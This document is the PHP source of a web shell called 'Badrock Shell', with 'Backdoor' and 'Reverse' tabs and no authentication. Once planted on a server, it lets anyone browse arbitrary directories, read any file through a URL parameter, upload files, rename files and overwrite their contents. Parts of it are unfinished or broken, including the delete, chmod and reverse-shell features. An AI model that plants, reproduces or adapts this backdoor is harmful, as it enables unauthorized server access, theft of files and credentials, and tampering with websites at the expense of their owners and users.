<?php 

error_reporting(0);
set_time_limit(0);

$PATH = './';

function systemdir($PATH = './'){
    $buka_folder = opendir($PATH);
    $data = [];
    
    while($baca_folder = readdir($buka_folder)){
        substr($baca_folder, 0,1 != '.');
        if($baca_folder != '.' && $baca_folder != '..'){
            $data[] = $baca_folder;
        }
    }
    return $data;
}

function validationfile($file){
    // if(!preg_match('#^\w+\.\w+$#', $file) && !preg_match('#^\.\w+$#', $file) && !preg_match('#^\w+\.\w+\.\w+$#', $file) && !preg_match('#^\w+\.\w+\.\w+\.\w+$#', $file)) return false;
    
    if(preg_match('#^\w+$#', $file)) return false;
    return true;
}

$data = systemdir($PATH);

if(isset($_GET['path'])){
    $PATH = $_GET['path'];
    if(isset($_GET['delete'])){
        var_dump('asdf');
    }
    $data = systemdir($_GET['path']);

}

if(isset($_GET['path'])){
    $path = $_GET['path'];
}else {
    $path = getcwd();
}

$path = str_replace('\\','/',$path);
$paths = explode('/', $path);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Badrock Shell</title>
    <style>
        html,body {overflow-x: hidden;}
        * {
            margin: 0px;
            padding: 0px;
            box-sizing: border-box;
            font-family: sans-serif;
        }

        header div img {
            font-size: 30px;
            text-align: center;
            margin-top: 50px;
            color: #222;
        }

        header div {
            width: 100px;
            margin: 0px auto;
        }

        .wrapper {
            width: auto;
        }

        .nav {
            width: auto;
            background-color: #222
        }

        .nav ul {
            width: 200px;
            margin: 0px auto;
            display: flex;
            flex-direction: space-between;
            justify-content: center;
        }

        .nav ul li {
            display: inline-block;
            cursor: pointer;
            padding: 20px;
        }

        .nav ul li a{
            list-style: none;
            color: #eee;
            margin-right: 10px;
        }

        .backdoor {
            width: 950px;
            margin: 0px auto;
        }
        
        .backdoor-wrapper {
            width: 80%;
            margin: 80px auto;
            max-width: 700px;
        }

        .backdoor-wrapper table {
            border-collapse: collapse;
            font-size: 0.9em;
            min-width: 400px;
            width: 100%;
            box-shadow: 0 0 20px rgba(0,0,0,0.15);
        }

        .backdoor-wrapper table tr {
            width: 100%;
            display: flex;
            flex-direction: space-between;
            
        }

        .backdoor-wrapper table tr .stable {
            margin-left: auto;
        }

        .backdoor-wrapper table tr td {
            padding: 12px 15px;
            cursor: pointer;
        }

        .backdoor-wrapper table tr td a {
            text-decoration: none;
        }

        .reverse{
            display: none;            
        }

        .backdoor-wrapper table tr:hover {
            background-color:#ddd;
        }

        .path {
            margin-bottom: 15px;
            width: 100%;
            display: flex;
            flex-direction: row;
        }

        .path h3 {
            font-weight: 200;
            font-size: 15px;
        }

        .real-path {
            margin-left: 10px;
            display: flex;
            flex-direction: row;
        }

        .real-path a {
            text-decoration: none;
            margin: 0px;
        }

        .upload {
            margin-bottom: 15px;
        }

        .upload form {
            display: flex;
            flex-direction: row;
        }

        .upload form h3 {
            font-weight: 200;
            margin-right: 10px;
            font-size: 15px;
            margin-top: 2px;
        }

        .upload form input {
            cursor: pointer;
        }

        .upload form button {
            padding: 0px 5px;
            border: none;
            border: 1px solid #555;
            border-radius: 3px;
            cursor:pointer;
        }

        .upload form p {
            margin-left: 10px;
        }

        .fileme {
            margin-bottom: 20px;
        }

        .fileme h3 {
            font-weight: 200;
            font-size: 15px;
        }

        .source-code {
            width: 900px;
            background-color: #444;
            margin-left: -100px;
            overflow: auto;
            padding: 40px;
            border-radius: 4px;
            margin-top: 60px;
        }

        .rename {
            width: auto;
        }

        .rename form {
            display: flex;
            flex-direction: row;
        }

        .rename form h3 {
            font-weight: 200;
            font-size: 15px;
            margin-top: 5px;
        }

        .rename form input {
            margin-left: 10px;
            padding: 3px 6px;
        }

        .button {
            border: none;
            margin-left: 8px;
            border: 1px solid #eee;
            padding: 0px 4px;
            border-radius: 3px;
            color: #555;
            cursor: pointer
        }

        .rename form input:focus {
            outline: none;
        }

        .edit {
            width: auto;
            overflow-x: auto;
        }

        .edit form input {
            width: 100%;
            height: 60vh;
        }

    </style>
</head>
<body>
    <header>
        <div class="wrapper">
            <div class="nav">
                <ul>
                    <li id="backdoor"><a>Backdoor</a></li>
                    <li id="reverse"><a>Reverse</a></li>
                </ul>
            </div>
        </div>
        <div>
            <img src="https://cdn.dribbble.com/userupload/11888656/file/original-9ae72af7bb2188ef6c5739e4f0d075c1.jpg?resize=100x100" alt="Shell Backdoor by Medusa">
        </div>
    </header>

    <section class="backdoor" id="backdoor-chanel">
        <div class="backdoor-wrapper">
            <div class="path">
                <h3>Path : </h3>
                <div class="real-path">
                    <?php foreach($paths as $id=>$pat) { ?>
                        <?php if($pat == '' && $id == 0) { ?>
                            <a href="?path=/">/</a>
                        <?php continue; } ?>

                        <?php if($pat == '') continue; ?>
                        <a href="?path=<?php 
                            for($i = 0; $i <= $id; $i++){
                                echo $paths[$i];
                                if($i != $id) echo '/';
                            }
                            echo '/';
                        ?>"><?= $pat ?></a>/
                    <?php } ?>
                </div>
            </div>
            
            <?php if(!isset($_GET['fileme']) && !isset($_GET['option'])) { ?>
                <div class="upload">
                    <form enctype="multipart/form-data" method="POST">
                        <h3>File Upload : </h3>
                        <input type="file" name="file">
                        <button type="submit">upload</button>
                        <?php 
                            if(isset($_FILES['file'])){
                                if(copy($_FILES['file']['tmp_name'], $path . $_FILES['file']['name'])){
                                    echo '<p>Upload Berhasil</p>';
                                }else {
                                    echo '<p>Upload Gagal</p>';
                                }
                            }
                        ?>
                    </form>

                </div>
            <?php } ?>
            <div class="fileme">
                <?php 
                    if(isset($_GET['fileme'])){
                        echo '<h3>Current < : ' .$_GET['fileme']. '</h3>';
                    }
                ?>
            </div>
            
            <?php if(isset($_GET['fileme'])) { ?>
                <div class="source-code">
                    <p><pre style="color: #ddd;"><?= wordwrap(htmlspecialchars(file_get_contents($_GET['fileme'])), 100, "<br>\n"); ?></pre></p>
                </div>
            <?php }elseif(isset($_GET['option']) && $_POST['execselect'] != 'delete'){ ?>
                <?php if($_POST['execselect'] == 'edit') { ?>
                    <div class="edit">
                        <form enctype="multipart/form-data" method="POST">
                            <input type="text" value="<?= htmlspecialchars(file_get_contents($_POST['path'])); ?>" name="textcode">
                            <button type="submit" name="tsave">save</button>
                        </form>
                    </div>
                <?php }elseif($_POST['execselect'] == 'rename') { ?>
                    <div class="rename">
                        <form method="POST">
                            <h3>Rename File : </h3>
                            <input type="text" name="rename" value="<?= $_POST['name'] ?>">
                            <button class="button" type="submit">save</button>
                        </form>
                    </div>
                <?php } ?>

                <?php 
                    if(isset($_POST['rename'])){
                        if(rename($_POST['path'], $path.$_POST['rename'])){
                            echo '<p>Rename Sucess</p>';
                        }else {
                            echo '<p>Permision Denied</p>';
                        }
                    }
                ?>
            <?php }else { ?>
                <table>
                    <?php
                        $subFolder = scandir($path);
                        $len = count($subFolder);
                        for($i=2;$i<$len;$i++){
                    ?>
                            <tr>
                                <?php if(is_file($path . '/' .$subFolder[$i])) { ?>
                                    <td><p>[F]</p></td>
                                <?php }else { ?>
                                    <td><p>[D]</p></td>
                                <?php } ?>
                                <?php if(is_file($path . '/' . $subFolder[$i])) { ?>
                                    <td><a href="?fileme=<?= $PATH . $subFolder[$i]; ?>"><?= $subFolder[$i]; ?></a></td>
                                    <td class="stable"><p><?= filesize($PATH . $subFolder[$i]); ?>kb</p></td>
                                    <td>
                                        <form enctype="multipart/form-data" method="POST" action="?option&path=<?= $path; ?>">
                                            <select name="execselect">
                                                <option value="asdf"></option>
                                                <option value="edit">Edit</option>
                                                <option value="delete">Delete</option>
                                                <option value="rename">Rename</option>
                                                <option value="chmod">Chmod</option>
                                            </select>
                                            <input type="hidden" name="type" value="file">
                                            <input type="hidden" name="name" value="<?= $subFolder[$i] ?>">
                                            <input type="hidden" name="path" value="<?= $path.$subFolder[$i] ?>">
                                            <button style="cursor: pointer;" type="submit" name="execsubmit">></button>
                                        </form>
                                    </td>
                                <?php }else { ?>
                                    <td><a href="?path=<?= $PATH . $subFolder[$i] . '/' ?>"><?= $subFolder[$i] ?></a></td>
                                    <td class="stable"><p>...</p></td>
                                    <td>
                                        <form enctype="multipart/form-data" method="POST" action="?option&path=<?= $path; ?>">
                                            <select name="execselect">
                                                <option value="asdf"></option>
                                                <option value="delete">Delete</option>
                                                <option value="rename">Rename</option>
                                                <option value="chmod">Chmod</option>
                                            </select>
                                            <input type="hidden" name="type" value="dir">
                                            <input type="hidden" name="name" value="<?= $subFolder[$i] ?>">
                                            <input type="hidden" name="path" value="<?= $path . $subFolder[$i] ?>">
                                            <button style="cursor: pointer;" type="submit" name="execsubmit">></button>
                                        </form>
                                    </td>
                                <?php } ?>
                            </tr>
                    <?php } ?>
                </table>
            <?php } ?>
        </div>
    </section>

    <section class="reverse" id="reverse-chanel">
        <div>
            reverse
        </div>
    </section>

    <script>
        const backdoor = document.getElementById('backdoor');
        const reverse = document.getElementById('reverse');
        const backdoorChanel = document.getElementById('backdoor-chanel');
        const reverseChanel = document.getElementById('reverse-chanel');

        backdoor.addEventListener('click', (e) => {
            reverseChanel.style.display = 'none';
            backdoorChanel.style.display = 'block';
        });

        reverse.addEventListener('click', (e) => {
            reverseChanel.style.display = 'block';
            backdoorChanel.style.display = 'none';
        })
    </script>
</body>
</html>